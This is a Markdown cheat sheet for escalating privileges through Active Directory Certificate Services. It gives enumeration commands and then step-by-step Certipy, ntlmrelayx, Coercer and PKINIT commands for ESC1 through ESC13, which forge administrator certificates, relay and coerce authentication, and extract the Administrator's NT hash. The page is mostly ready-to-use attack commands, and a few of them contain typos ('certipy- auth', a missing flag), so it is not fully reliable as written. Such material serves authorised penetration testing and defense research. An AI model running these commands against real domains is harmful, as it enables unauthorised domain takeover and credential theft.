# Attacks
- [ESC1](#esc1)
- [ESC3](#esc3)
- [ESC4](#esc4)
- [ESC6](#esc6)
- [ESC7](#esc7)
- [ESC8](#esc8)
- [ESC9](#esc9)
- [ESC13](#esc13)

# Enumeration
### NetExec
Find PKI Enrollment Services in Active Directory and Certificate Templates Names
```
nxc ldap ip -u username -p password -M adcs
```
### Certipy
Search for vulnerable certificate templates
```
certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout
```
List CAs, servers and search for vulnerable certificate templates
```
certipy find -u username -p password -dc-ip ip -dns-tcp -ns ip -debug
```
### Certify
Search for vulnerable certificate templates
```powershell
Certify.exe find /vulnerable
```
# Attacks
## ESC1
Create a new machine account
```
addcomputer.py domain/username:password -computer-name computer_name -computer-pass computer_password
```
Use ability to enroll as a normal user & provide a user defined Subject Alternative Name (SAN)
```
certipy req -u computer_name -p computer_password -ca ca -target domain -template template -upn administrator@domain -dns domain -dc-ip ip
```
Or
```
certipy req -u username -p password -ca ca -target domain -template template -upn administrator@domain -dns domain -dc-ip ip
```
Authenticate with the certificate and get the NT hash of the Administrator
```
certipy auth -pfx pfx_file -domain domain -username username -dc-ip ip
```
## ESC3
Request a certificate
```
certipy req -username username -password password -ca ca -target domain -template template
```
Request a certificate on behalf of other another user
```
certipy req username -password password -ca ca -target domain -template User -on-behalf-of 'domain\administrator' -pfx pfx_file
```
Authenticate as Administrator
```
certipy auth -pfx administrator.pfx -dc-ip ip
```
## ESC4
```
certipy template -username username -password password -template template -save-old -dc-ip ip
```
```
certipy req -u username -p password -dc-ip ip -ca ca -target dc -template template -upn administrator@domain
```
```
certipy auth -pfx administrator.pfx -domain domain -username administrator -dc-ip ip
```
## ESC6
```
certipy req -username administrator@domain -password password -ca ca -target domain -template template -upn administrator@domain
```
## ESC7
In order for this technique to work, the user must also have the `Manage Certificates` access right, and the certificate template `SubCA` must be enabled. With the `Manage CA` access right, we can fulfill these prerequisites.
If you only have the `Manage CA` access right, you can grant yourself the `Manage Certificates` access right by adding your user as a new officer.
```
certipy ca -ca ca -add-officer username -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
```
Enable the `SubCA` template on the CA using the `-enable-template` parameter. By default, the `SubCA` template is enabled.
```
certipy ca -ca ca -enable-template SubCA -username username@domain -password password -dc-ip ip -dns-tcp -ns ip
```
This request will be denied, but we will save the private key and note down the request ID.
```
certipy req -username username@domain -password password -ca ca -target ip -template SubCA -upn username@domain
```
With our `Manage CA` and `Manage Certificates`, we can then issue the failed certificate request with the `ca` command and the `-issue-request <request ID>` parameter.
```
certipy ca -ca ca -issue-request request_ID -username username@domain -password password
```
And finally, we can retrieve the issued certificate with the `req` command and the `-retrieve <request ID>` parameter.
```
certipy req -username username@domain -password password -ca ca -target ip -retrieve request_ID
```
Authenticate with the certificate and get the NT hash of the Administrator
```
certipy auth -pfx pfx_file -domain domain -username username -dc-ip ip
```
## ESC8
If there is an ADCS Server that is not on the DC and has Web Enrollement activated we might be able to exploit ESC8.
```
ntlmrelayx.py -t http://domain/certsrv/certfnsh.asp -smb2support --adcs --template template --no-http-server --no-wcf-server --no-raw-server
```
```
coercer coerce -u username -p password -l ws_ip -t dc_ip --always-continue
```
```
certipy- auth -pfx administrator.pfx
```
## ESC9
```
certipy shadow auto -username username@domain -hashes :hash -account target_username
```
```
certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
```
```
certipy req -username target_username@domain -hashes :target_hash -ca ca -template template -target $DC_IP
```
```
certipy account update -username username@domain -hashes :hash -user target_username -upn administrator
```
```
certipy auth -pfx administrator.pfx -domain domain
```
## ESC13
```
certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip -key-size 4096
```
```
python3 gettgtpkinit.py -cert-pfx pfx_file domain/username ccache_file -dc-ip ip -v
```
# Resources
- https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
- https://swisskyrepo.github.io/InternalAllTheThings/active-directory/ad-adcs-certificate-services/#adcs-enumeration
- https://vulndev.io/2023/07/01/vl-intercept-walkthrough/
- https://www.bulletproof.co.uk/blog/abusing-esc13-from-linux
- https://logan-goins.com/2024-05-04-ADCS/
- https://www.tarlogic.com/blog/ad-cs-esc7-attack/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/
- https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/
# Tools
- https://github.com/ly4k/Certipy
- https://github.com/GhostPack/Certify
